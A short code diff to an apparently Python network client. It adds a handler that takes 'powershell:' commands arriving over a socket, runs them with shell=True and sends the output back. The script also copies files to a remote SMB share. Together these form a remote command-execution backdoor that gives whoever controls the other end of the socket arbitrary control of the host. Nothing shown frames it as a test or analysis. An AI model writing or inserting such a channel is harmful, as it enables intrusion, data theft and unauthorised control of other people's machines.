@@ -47,6 +47,14 @@ def handle_command(command_data):
         subprocess.run(["copy", file_name, r"\\{host_ip}\osfm_share".format(host_ip=host)])
     elif command == "FILE_TRANSFER_COMPLETE":
         print("File transfer complete.")
+    elif command.startswith("powershell:"):
+        powershell_command = command.split(":", 1)[1]
+        try:
+            output = subprocess.check_output(["powershell", "-Command", powershell_command], shell=True)
+            client_socket.sendall(output)
+        except subprocess.CalledProcessError as e:
+            error_msg = str(e).encode('utf-8')
+            client_socket.sendall(error_msg)
 
 def receive_and_save_files(client_socket):
     while True:
@@ -95,5 +103,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
